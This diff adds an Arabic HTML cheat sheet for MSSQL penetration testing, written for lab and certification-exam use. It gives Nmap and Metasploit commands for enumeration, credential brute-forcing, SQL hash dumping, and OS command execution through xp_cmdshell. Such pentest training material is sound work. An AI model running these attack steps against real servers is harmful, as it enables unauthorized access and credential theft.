@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>MSSQL Cheat Sheet</title>
+<style>
+:root{
+  --bg:#0b0b0b;
+  --panel:#141414;
+  --panel-2:#1a1a1a;
+  --border:#2b2b2b;
+  --gold:#d4af37;
+  --gold-dim:#8a712a;
+  --yellow:#e8c547;
+  --text:#e9e6da;
+  --text-dim:#a19c8c;
+  --mono:#f2e6b8;
+  --green:#7fae4a;
+  --red:#b5544a;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Tahoma","Segoe UI",sans-serif;
+  margin:0;
+  padding:0 0 4rem;
+  line-height:1.7;
+}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+.hero{border-bottom:1px solid var(--border);padding-bottom:1.5rem;margin-bottom:2rem;}
+.hero .tag{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:13px;color:var(--bg);background:var(--gold);padding:2px 10px;border-radius:3px;margin-bottom:10px;letter-spacing:.5px;}
+.hero h1{font-size:30px;margin:0 0 6px;color:var(--yellow);}
+.hero p{color:var(--text-dim);margin:0;font-size:14px;}
+.signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+.signature b{color:var(--gold);font-weight:normal;}
+.stage{margin-bottom:2.2rem;background:var(--panel);border:1px solid var(--border);border-right:3px solid var(--gold);border-radius:6px;padding:1.2rem 1.4rem;}
+.stage h2{color:var(--gold);font-size:19px;margin:0 0 4px;display:flex;align-items:center;gap:8px;}
+.stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+h3.sub{color:var(--yellow);font-size:15px;margin:18px 0 8px;border-bottom:1px dashed var(--border);padding-bottom:5px;}
+h3.sub:first-of-type{margin-top:0;}
+.step{margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+.step-title{font-size:14.5px;color:var(--text);margin-bottom:6px;font-weight:bold;}
+.where{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:11px;background:var(--panel-2);color:var(--yellow);border:1px solid var(--gold-dim);padding:1px 8px;border-radius:10px;margin-inline-start:8px;vertical-align:middle;}
+.cmd{background:#0e0e0e;border:1px solid var(--border);border-radius:5px;padding:10px 14px;font-family:"Consolas","Courier New",monospace;font-size:13.5px;color:var(--mono);direction:ltr;text-align:left;overflow-x:auto;margin:6px 0;white-space:pre;}
+.cmd .cm{color:#6b6b6b;}
+.note{font-size:12.5px;color:var(--text-dim);margin-top:4px;}
+.note b{color:var(--yellow);font-weight:normal;}
+.tip{background:rgba(212,175,55,.08);border-inline-start:2px solid var(--gold);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.danger{background:rgba(181,84,74,.08);border-inline-start:2px solid var(--red);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.result{font-size:12.5px;color:var(--green);margin-top:6px;font-family:"Consolas","Courier New",monospace;direction:ltr;text-align:left;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+.toc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1rem 1.3rem;margin-bottom:2rem;font-size:13.5px;}
+.toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+.toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+.toc li{margin-bottom:4px;}
+.toc a{color:var(--text-dim);text-decoration:none;}
+.toc a:hover{color:var(--yellow);}
+.portnote{background:var(--panel-2);border:1px solid var(--gold-dim);border-radius:6px;padding:.8rem 1.1rem;margin-bottom:2rem;font-size:13px;color:var(--text-dim);}
+.portnote b{color:var(--yellow);}
+.badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:8px;margin-inline-start:6px;font-family:"Consolas",monospace;vertical-align:middle;}
+.badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+.badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+footer{text-align:center;color:var(--text-dim);font-size:11.5px;margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--border);}
+footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="hero">
+<span class="tag">PORT 1433 / TCP — MICROSOFT SQL SERVER</span>
+<h1>MSSQL — من الفحص إلى ما بعد الاستغلال</h1>
+<p>مرجع سريع أثناء اللاب — اكتشاف SQL Server، اختبار الحسابات، Enumeration، ثم xp_cmdshell عند تحقق الصلاحيات</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div>
+</div>
+<div class="portnote">
+<b>ملاحظة عن البورت:</b> المنفذ الشائع لـMicrosoft SQL Server هو 1433/TCP، لكن الـinstance قد يعمل على منفذ مختلف.
+    إذا لم يظهر على 1433، لا تستبعد MSSQL قبل فحص جميع البورتات وتحديد الخدمة بالإصدار.
+  </div>
+<div class="toc">
+<span class="ttl">الفهرس</span>
+<ol>
+<li><a href="#s1">Reconnaissance</a></li>
+<li><a href="#s2">Port Scanning</a></li>
+<li><a href="#s3">Enumeration</a></li>
+<li><a href="#s4">Credential Testing</a></li>
+<li><a href="#s5">Exploitation</a></li>
+<li><a href="#s6">Post-Exploitation</a></li>
+</ol>
+</div>
+<div class="stage" id="s1">
+<h2>1. Reconnaissance</h2>
+<p class="desc">تأكد من الشبكة والهدف أولًا، ثم ابحث عن MSSQL ضمن الخدمات المكشوفة.</p>
+<div class="step">
+<div class="step-title">معرفة عنوانك والواجهة <span class="where">KALI TERMINAL</span> <span class="badge">GENERAL</span></div>
+<div class="cmd">ip a
+ifconfig</div>
+<div class="note">في بيئة VPN راقب واجهة مثل <b>tun0</b> لمعرفة عنوان المهاجم الصحيح.</div>
+</div>
+<div class="step">
+<div class="step-title">اختبار الوصول للهدف <span class="where">KALI TERMINAL</span> <span class="badge">GENERAL</span></div>
+<div class="cmd">ping -c 4 [TARGET]</div>
+<div class="tip">إذا لم يرد الهدف على ICMP لا تعتبره Down؛ أكمل بـNmap واستخدم <code>-Pn</code> عند الحاجة.</div>
+</div>
+<div class="step">
+<div class="step-title">اكتشاف الأجهزة عند الحاجة <span class="where">KALI TERMINAL</span> <span class="badge">GENERAL</span></div>
+<div class="cmd">nmap -sn [SUBNET]</div>
+</div>
+</div>
+<div class="stage" id="s2">
+<h2>2. Port Scanning</h2>
+<p class="desc">ابدأ بالمنفذ الشائع ثم انتقل للفحص الشامل إذا لم يظهر SQL Server.</p>
+<div class="step">
+<div class="step-title">فحص MSSQL مع Service Detection <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 -sV [TARGET]</div>
+<div class="result">✓ ابحث عن: 1433/tcp open  ms-sql-s</div>
+</div>
+<div class="step">
+<div class="step-title">فحص مركز مع Default Scripts <span class="where">KALI TERMINAL</span> <span class="badge">GENERAL</span></div>
+<div class="cmd">nmap -p1433 -sV -sC [TARGET]</div>
+<div class="note">يساعد في التقاط معلومات إضافية قبل الانتقال إلى MSSQL NSE scripts المتخصصة.</div>
+</div>
+<div class="step">
+<div class="step-title">إذا لم يظهر 1433 — افحص جميع TCP ports <span class="where">KALI TERMINAL</span> <span class="badge">GENERAL</span></div>
+<div class="cmd">nmap -p- --min-rate=1000 -T4 [TARGET]</div>
+<div class="tip">إذا اكتشفت MSSQL على منفذ مختلف، استبدل 1433 بالمنفذ الفعلي في الفحوص اللاحقة.</div>
+</div>
+</div>
+<div class="stage" id="s3">
+<h2>3. Enumeration</h2>
+<p class="desc">اجمع معلومات الـinstance والمصادقة، ثم أعد Enumeration بعد الحصول على Credentials.</p>
+<h3 class="sub">Instance / NTLM Information</h3>
+<div class="step">
+<div class="step-title">معلومات SQL Server عبر Nmap <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script ms-sql-info [TARGET]</div>
+<div class="note">استخدم الناتج لتحديد الـinstance والإصدار والمعلومات المتاحة قبل تسجيل الدخول.</div>
+</div>
+<div class="step">
+<div class="step-title">استخراج NTLM information <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 [TARGET]</div>
+<div class="tip">قد يكشف معلومات مفيدة عن Windows host/domain تساعدك في ربط MSSQL بباقي خدمات الهدف.</div>
+</div>
+<h3 class="sub">Enumeration بعد Credentials</h3>
+<div class="step">
+<div class="step-title">Enumeration عام عبر Metasploit <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/admin/mssql/mssql_enum
+set RHOSTS [TARGET]
+set USERNAME [USERNAME]
+set PASSWORD [PASSWORD]
+run</div>
+</div>
+<div class="step">
+<div class="step-title">Enumeration لحسابات SQL Logins <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/admin/mssql/mssql_enum_sql_logins
+set RHOSTS [TARGET]
+set USERNAME [USERNAME]
+set PASSWORD [PASSWORD]
+run</div>
+<div class="note">استخدم الحسابات المكتشفة فقط ضمن مسار اللاب، ثم اختبر Credential reuse إذا كان ذلك منطقيًا.</div>
+</div>
+<div class="step">
+<div class="step-title">عرض SQL logins عبر Nmap query <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script ms-sql-query --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD],ms-sql-query.query="SELECT * FROM master..syslogins" [TARGET]</div>
+</div>
+<div class="step">
+<div class="step-title">Domain Accounts Enumeration <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/admin/mssql/mssql_enum_domain_accounts
+set RHOSTS [TARGET]
+set USERNAME [USERNAME]
+set PASSWORD [PASSWORD]
+run</div>
+<div class="note">قد يعرض Windows domain users/groups/computer accounts عندما تسمح بيئة SQL Server بذلك.</div>
+</div>
+</div>
+<div class="stage" id="s4">
+<h2>4. Credential Testing</h2>
+<p class="desc">اختبر Empty Password والـwordlists ثم أكد أي Credentials ناجحة قبل الاستغلال.</p>
+<div class="step">
+<div class="step-title">فحص Empty Password عبر Nmap <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script ms-sql-empty-password [TARGET]</div>
+</div>
+<div class="step">
+<div class="step-title">Brute Force عبر Nmap NSE <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script ms-sql-brute --script-args userdb=[USERLIST],passdb=[WORDLIST] [TARGET]</div>
+<div class="result">✓ عند النجاح يعرض الـscript الحساب/كلمة المرور التي تم قبولها.</div>
+</div>
+<div class="step">
+<div class="step-title">Credential Testing عبر Metasploit <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/mssql/mssql_login
+set RHOSTS [TARGET]
+set USER_FILE [USERLIST]
+set PASS_FILE [WORDLIST]
+run</div>
+<div class="tip">بعد نجاح حساب، لا تكمل brute force بلا داعٍ؛ انتقل مباشرة إلى Enumeration الموثق بالحساب.</div>
+</div>
+<div class="step">
+<div class="step-title">تأكيد Login يدويًا <span class="where">KALI TERMINAL</span> <span class="badge">GENERAL</span></div>
+<div class="cmd">impacket-mssqlclient [USERNAME]:[PASSWORD]@[TARGET]</div>
+<div class="note">إذا كانت الأداة مثبتة باسم قديم في بيئتك قد تجدها كـ<code>mssqlclient.py</code>.</div>
+</div>
+<div class="step">
+<div class="step-title">Brute-force عبر Nmap NSE <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script=ms-sql-brute --script-args userdb=[USERLIST],passdb=[WORDLIST] [TARGET]</div>
+</div><div class="step">
+<div class="step-title">Brute-force عبر Metasploit <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/mssql/mssql_login
+set RHOSTS [TARGET]
+run</div>
+</div></div>
+<div class="stage" id="s5">
+<h2>5. Exploitation</h2>
+<p class="desc">المسار الأساسي هنا هو استخدام صلاحيات SQL الموثقة ثم xp_cmdshell إذا كان متاحًا.</p>
+<div class="danger">
+<b>تحذير:</b> لا تفترض أن Credentials صحيحة تعني OS command execution. تحقق أولًا من صلاحيات الحساب وحالة <code>xp_cmdshell</code>.
+    </div>
+<h3 class="sub">Database / Hash Access <span class="badge win">WINDOWS</span></h3>
+<div class="step">
+<div class="step-title">Dump SQL login hashes عبر Nmap <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD] [TARGET]</div>
+<div class="note">يحتاج حسابًا يملك الصلاحية المناسبة؛ احتفظ بالـhashes لمسار Credential Access/Reuse عند الحاجة.</div>
+</div>
+<h3 class="sub">OS Command Execution — xp_cmdshell <span class="badge win">WINDOWS</span></h3>
+<div class="step">
+<div class="step-title">اختبار تنفيذ أمر بسيط عبر Nmap <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD],ms-sql-xp-cmdshell.cmd="ipconfig" [TARGET]</div>
+<div class="result">✓ النجاح = ظهور ناتج ipconfig الخاص بنظام Windows الهدف.</div>
+</div>
+<div class="step">
+<div class="step-title">قراءة ملف بعد تأكيد xp_cmdshell <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD],ms-sql-xp-cmdshell.cmd="type c:\\[FILE]" [TARGET]</div>
+</div>
+<div class="step">
+<div class="step-title">تنفيذ Command عبر Metasploit <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/admin/mssql/mssql_exec
+set RHOSTS [TARGET]
+set USERNAME [USERNAME]
+set PASSWORD [PASSWORD]
+set CMD whoami
+run</div>
+<div class="note">هذا المسار يعتمد على توفر xp_cmdshell والصلاحيات اللازمة.</div>
+</div>
+<div class="step">
+<div class="step-title">تنفيذ أمر من جلسة MSSQL اليدوية <span class="where">MSSQL CLIENT</span> <span class="badge">GENERAL</span></div>
+<div class="cmd">SQL&gt; xp_cmdshell whoami
+SQL&gt; xp_cmdshell ipconfig</div>
+<div class="tip">إذا نجح <code>whoami</code> فقد انتقلت من Database access إلى OS command execution؛ سجل هوية حساب خدمة SQL Server لأنها تحدد صلاحياتك الفعلية على Windows.</div>
+</div>
+<div class="step">
+<div class="step-title">تنفيذ استعلام مباشر (مثال: قراءة جدول تسجيل الدخول) <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script=ms-sql-query --script-args mssql.username=[USER],mssql.password=[PASS],ms-sql-query.query="SELECT * FROM master..syslogins" [TARGET]</div>
+</div><div class="step">
+<div class="step-title">استخراج هاشات المستخدمين <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script=ms-sql-dump-hashes --script-args mssql.username=[USER],mssql.password=[PASS] [TARGET]</div>
+</div><div class="step">
+<div class="step-title">تفعيل وتنفيذ أوامر نظام <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p1433 --script=ms-sql-xp-cmdshell --script-args mssql.username=[USER],mssql.password=[PASS],ms-sql-xp-cmdshell.cmd="whoami" [TARGET]</div>
+<div class="result">✓ النتيجة المتوقعة: يرجع خرج الأمر مباشرة بصفحة Nmap (مثال: nt authority\\system لو الخدمة تشتغل بصلاحية مرتفعة)</div>
+<div class="note">استبدل الأمر بـ <code style="direction:ltr">type c:\\flag.txt</code> أو أي أمر تاني حسب هدفك باللاب</div>
+<div class="danger"><b>تنويه:</b> xp_cmdshell يحتاج صلاحية sysadmin على الحساب المستخدم — لو الأمر ما نفذ رغم صحة بيانات الدخول، الحساب غالبًا صلاحياته محدودة.</div>
+</div><div class="step">
+<div class="step-title">عبر Metasploit — بديل أسهل للتكرار <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/admin/mssql/mssql_exec
+set RHOSTS [TARGET]
+set USERNAME [USER]
+set PASSWORD [PASS]
+set CMD whoami
+run</div>
+</div><div class="step">
+<div class="step-title">تعداد حسابات الدومين عبر MSSQL <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/admin/mssql/mssql_enum_domain_accounts
+set RHOSTS [TARGET]
+set USERNAME [USER]
+set PASSWORD [PASS]
+run</div>
+<div class="note">يكشف يوزرات وجروبات وأجهزة الدومين كاملة — مفيد جدًا لمرحلة Lateral Movement لاحقًا</div>
+</div></div>
+<div class="stage" id="s6">
+<h2>6. Post-Exploitation</h2>
+<p class="desc">بعد إثبات SQL أو OS access — تحقق من السياق فورًا ثم انتقل للمراجع العامة بدل تكرارها هنا.</p>
+<div class="step">
+<div class="step-title">تأكيد حساب SQL الحالي <span class="where">MSSQL CLIENT</span> <span class="badge">GENERAL</span></div>
+<div class="cmd">SQL&gt; SELECT SYSTEM_USER;
+SQL&gt; SELECT USER_NAME();</div>
+<div class="note">يفرق بين هوية SQL وهوية Windows التي تعمل بها خدمة SQL Server.</div>
+</div>
+<div class="step">
+<div class="step-title">تأكيد هوية Windows عبر xp_cmdshell <span class="where">MSSQL CLIENT</span></div>
+<div class="cmd">SQL&gt; xp_cmdshell whoami
+SQL&gt; xp_cmdshell hostname
+SQL&gt; xp_cmdshell ipconfig</div>
+<div class="result">✓ النجاح = أوامر Windows ترجع Output من الهدف داخل جلسة SQL.</div>
+</div>
+<div class="step">
+<div class="step-title">Credential Reuse بعد اكتشاف حساب صالح <span class="where">KALI TERMINAL</span></div>
+<div class="cmd"><span class="cm"># أعد اختبار الـCredentials المكتشفة فقط على الخدمات الأخرى التي ظهرت أثناء الفحص</span>
+nmap -sV [TARGET]</div>
+<div class="tip">إذا ظهر SMB/RDP/WinRM مع MSSQL، راجع Cheatsheet الخدمة نفسها لاختبار نفس الحساب بالطريقة الصحيحة بدل خلط الـworkflows هنا.</div>
+</div>
+<div class="step">
+<div class="step-title">إذا حصلت على Shell كامل <span class="where">VICTIM SHELL</span> <span class="badge">GENERAL</span></div>
+<div class="cmd">whoami
+hostname
+ipconfig</div>
+<div class="note">بعدها انتقل إلى Windows Post-Exploitation / Privilege Escalation؛ لا نكرر المراحل العامة داخل ملف MSSQL.</div>
+</div>
+</div>
+<footer>
+<div class="author">أُعدّ بواسطة Abdullah Nasser Almsan</div>
+<div class="disclaimer">
+      هذا الملف مرجع تقني شخصي مُعدّ لأغراض التعلّم واجتياز اختبارات الاختراق المرخّصة (زي EJPT) فقط.
+      يُستخدم حصرًا داخل بيئات Lab أو أنظمة مصرّح باختبارها رسميًا.
+      مُعدّه غير مسؤول عن أي استخدام خاطئ أو غير قانوني لهذا المحتوى خارج هذا النطاق.
+    </div>
+</footer>
+</div>
+</body>
+</html>
